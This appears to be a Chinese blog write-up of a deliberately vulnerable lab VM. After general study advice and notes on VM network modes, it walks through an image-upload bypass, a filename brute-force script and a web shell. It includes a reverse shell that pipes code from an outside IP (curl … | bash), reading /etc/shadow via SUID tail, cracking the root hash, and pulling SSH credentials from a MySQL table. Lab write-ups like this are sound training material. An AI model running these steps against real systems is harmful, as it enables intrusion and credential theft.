## 前言

要想走得远，需时刻提醒自己，走出舒适区，接受新知识。

> PS：相比直接了当的技术文章，这种心得类文章很少见，新人也喜欢看心得，可以解决心中的一些疑惑。
>
> 以后多写写，多做笔记，帮助他人等于帮助自己。

实战好玩，紧张刺激，但很难能针对性地练习某一种知识，实战更像是一种综合性的考试。

其次，大牛都说，渗透测试的本质就是信息收集，信息收集的充分性决定了日下来的可能性。可惜，信息收集最耗费的就是时间。对于新手来说，很容易得不偿失。这里表达并非是信息收集不需要练习，而是效益不高，平时的侧重点更应该放到对漏洞的敏感性训练上，否则即使你遇到漏洞依然发现不了，擦肩而过，这种情况就很尴尬了。

所以说，CTF 题目的练习是很重要的，将每个动作进行分解，练熟，以后遇到综合性的渗透也能游刃有余。

大型的 CTF 以及国际赛，考察的更是快速学习的能力，平常出烂了的套路题基本不会出现，没多大意义。一个陌生的情景下，对信息的搜集、漏洞的快速锁定以及漏洞的利用能力要求非常高，往往需要深入到源码底层，直接复制个 `exp` 打过去基本不会见效。出题人又不脑残，随便找个洞就来出题，或者简单粗暴的把环境搬过来，不是等人喷吗？

看了 `d3ckx1` 大佬的一些靶机渗透的 [文章](https://www.anquanke.com/member/124858)，心里也痒痒的，自己也想试试能不能日进去 ：）。

然而，还没开始就结束了啊，`nmap` 和 `netdiscover` 都没扫到端口，太尴尬了。

注意开桥接模式！在此顺便补充下常用的几种**虚拟机网络模式**。

+ bridged（桥接模式）

    在这种模式下，使用 `VMnet0` 虚拟交换机，虚拟机就像是局域网中的一台独立的主机，与宿主机一样，它可以访问网络内任何一台机器。再桥接模式下，可以手工配置它的 `TCP/IP` 配置信息（`IP`、子网掩码等，而且还要和宿主机处于同一网段），以实现通过局域网的网关或路由器访问互联网，还可以将 `IP` 和 `DNS` 设置成”自动获取“。

    在桥接模式中，使用VMnet0虚拟交换机，此时虚拟机相当与网络上的一台独立计算机与主机一样，拥有一个独立的IP地址。

    - A1、A2、A、B 四个操作系统可以相互访问
    - A1、A2 的 IP 为“外网” IP，可以手动设置，也可以自动获取

    ![](https://images0.cnblogs.com/blog/33509/201305/06230732-2bf87fc799ef41c989be329c62a3fe80.png)

+ NAT（网络地址转换模式）

    使用 `NAT` 模式，就是让虚拟机借助 `NAT` （网络地址转换）功能，通过宿主机所在的网络来访问公网。也就是说，使用 `NAT` 模式可以实现在虚拟系统里访问互联网。`NAT` 模式下虚拟机的 `TCP/IP` 配置信息是由 `VMnet8` 虚拟网络的 `DHCP` 服务器提供的，因此 `IP` 和 `DNS` 一般设置为“自动获取”，因此虚拟系统也就无法和本局域网中的其他真实主机进行通讯。

    最大的优势是，虚拟机接入互联网非常简单，不需要进行其他的配置，只要宿主机能联网即可。

    **如下图所示**

    - A1、A2 可以访问 B
    - B 不可以访问 A1、A2
    - A1、A2、A相互访问
    - A1、A2 的 IP 为局域网 IP，可以手动配置，也可以自动获取

    ![](https://images0.cnblogs.com/blog/33509/201305/06230741-3447f387a8f14f528ff5a23f5b569145.png)

+ host-only（主机模式）

    虚拟机只能与虚拟机、主机互访，但虚拟机和外部的网络是被隔离开的，也就是不能上 `Internet`。

    在 host-only 模式下，虚拟系统的 TCP/IP 配置信息（如IP地址、网关地址、DNS服务器等），都是由VMnet1 虚拟网络的 DHCP 服务器来动态分配的。

    使用host-only方式：

    - A、A1、A2 可以互访
    - A1、A2 不能访问 B
    - B 不能访问 A1、A2
    - A1、A2 为局域网 IP，可以手动配置，也可以设置成自动获取模式

    ![](https://images0.cnblogs.com/blog/33509/201305/06230823-03336f6007ce428c80418ae11161dc22.png)

## 正文

### 信息收集

扫半天，扫不到IP。关机，换成桥接模式后开机，访客模式进去，直接查看 IP。

![](http://ww1.sinaimg.cn/large/de75fd55gy1g1xne1vfncj20j20c7gob.jpg)

紧接着查看一下端口信息

![](http://ww1.sinaimg.cn/large/de75fd55gy1g1xnerjyghj20nx0b94bh.jpg)

### 源码泄露

扫目录发现有 `/upload.php` ，查看源码可得 GitHub 链接。

```php
if(isset($_POST["submit"])) {
	$rand_number = rand(1,100);
	$target_dir = "uploads/";
    // 直接爆破
	$target_file = $target_dir . md5(basename($_FILES["file"]["name"].$rand_number));
	$file_name = $target_dir . basename($_FILES["file"]["name"]);
	$uploadOk = 1;
    // shell.php/.
	$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));
	$type = $_FILES["file"]["type"];
    // 只验证了文件名
	$check = getimagesize($_FILES["file"]["tmp_name"]);
	if($check["mime"] == "image/png" || $check["mime"] == "image/gif"){
		$uploadOk = 1;
	}else{
		$uploadOk = 0;
		echo ":)";
	} 
  if($uploadOk == 1){
      move_uploaded_file($_FILES["file"]["tmp_name"], $target_file.".".$imageFileType);
      echo "File uploaded /uploads/?";
  }
}
```

[getimagesize 函数不是完全可靠的](<https://0x1.im/blog/php/php-function-getimagesize.html>)

修改成功。可按上面链接的方法改，也可直接在 post 内容里加上 `GIF89a;` 之类的头信息。

![](http://ww1.sinaimg.cn/large/de75fd55gy1g1xol2qxk6j20cw05874g.jpg)

再写一个脚本

```python
import requests, hashlib

for i in range(101):
    url = "http://192.168.0.106:8000/uploads/"
    key = '2.php' + str(i)
    m5 = hashlib.md5(key.encode()).hexdigest()
    url += m5 + '.php'
    re = requests.get(url)
    print(re.status_code)
    if re.status_code == 200:
        print(url, 23333333333333333333333333333333333333333333333333)
        break
```

或者按这种 `fuzz` 的办法，也可以用 `Burp` 中的 `instruder` ，不再赘述。

```
wfuzz -w test.txt --hc 404 http://localhost:8000/uploads/FUZZ.php
```

### 反弹 shell

直接弹 shell，成功。也可以执行 `nc` 命令把 bash 反弹出来。

```
http://192.168.0.106:8000/uploads/9e2b0f7dd8852a2987e7ade6fb2e948f.php
?1=system("curl 47.101.220.241|bash");
```

### 开始提权

```shell
# 查看内核信息
uname -a
Linux 1afdd1f6b82c 4.15.0-29-generic #31~16.04.1-Ubuntu SMP Wed Jul 18 08:54:04 UTC 2018 x86_64 GNU/Linux
# 比较新，有相应的 cve 可以提权，然而要等一个多小时

# 查看以 root 运行的服务
www-data@1afdd1f6b82c:/var/www/html$ ps -aux | grep root
root   1  0.0  1.6 388000 16496 ?    Ss   09:12   0:00 apache2 -DFOREGROUND
root   77  0.0  0.2  18000  2560 ?   Ss   09:12   0:00 /bin/bash /etc/init.d/delete.sh
root       370  0.0  0.0   4200   676 ?        S    12:52   0:00 sleep 300
www-data   390  0.0  0.0  11116   944 ?        S    12:57   0:00 grep root

# 哈哈，还有个定时删除的任务
#!/bin/bash
while [ 1 ]
do
    rm -rf /var/www/html/uploads/*.php
    sleep 300
done

# uid
find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/tail
/usr/bin/chfn
/bin/mount
/bin/umount
/bin/su

# 能拿到 root 的哈希
tail -n 100 /etc/shadow
root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::

# 把这个存为 hash
john hash
john --show
# 得到密码：john
```

无法直接在 `nc` 里切到 root，拿到密码之后连接 `ssh` 试试，密码错误，必须模拟一下终端设备。

```shell
 python -c 'import pty;pty.spawn("/bin/sh")'
```

先看下 `flag` ，还是不行。

```shell
cat flag
Life consists of details..
```

那我们再找找，`/root` 目录下还有个东西。

```shell
cat .port
Listen to your friends..
7*
```

### 峰回路转

找了下 7 开头的端口，发现没这玩意。不过我们遗漏了 MySQL，去看看。

```shell
cat wp-config.php
/** MySQL database username */
define('DB_USER', 'wordpress');
/** MySQL database password */
define('DB_PASSWORD', 'wordpress');
/* MySQL hostname */
define('DB_HOST', 'db:3306');

# 直接进入失败了
mysql -u wordpress -p wordpress
ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2 "No such file or directory")

# 先拿到 ip
ping db -c 3
64 bytes from experimental_db_1.experimental_default (172.18.0.2): icmp_seq=65 ttl=64 time=0.044 ms

# 远程连接试试
mysql -h 172.18.0.2 -u wordpress -p wordpress
MySQL [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.00 sec)

MySQL [(none)]> use wordpress;
use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [wordpress]> show tables;
show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| host_ssh_cred         |
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
13 rows in set (0.00 sec)

MySQL [wordpress]> select * from host_ssh_cred;
select * from host_ssh_cred;
+-------------------+----------------------------------+
| id                | pw                               |
+-------------------+----------------------------------+
| hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e |
+-------------------+----------------------------------+
1 row in set (0.00 sec)
```

### 拿到权限

解密可得 `123456`，此时再试试 `ssh` 连接。

```shell
hummingbirdscyber@vulnvm:~$ id
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)
```

发现 docker 的身影

```shell
docker ps
hummingbirdscyber@vulnvm:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES
252fa8cb1646        ubuntu              "/bin/bash"              6 weeks ago         Up 5 minutes                               brave_edison
1afdd1f6b82c        wordpress:latest    "docker-entrypoint.s…"   6 weeks ago         Up 5 minutes        0.0.0.0:8000->80/tcp   experimental_wordpress_1
81a93420fd22        mysql:5.7           "docker-entrypoint.s…"   6 weeks ago         Up 5 minutes        3306/tcp, 33060/tcp    experimental_db_1
```

进了几个容器看了下，找不到 `flag`，卡住了。拿到权限就行，以后再补充。

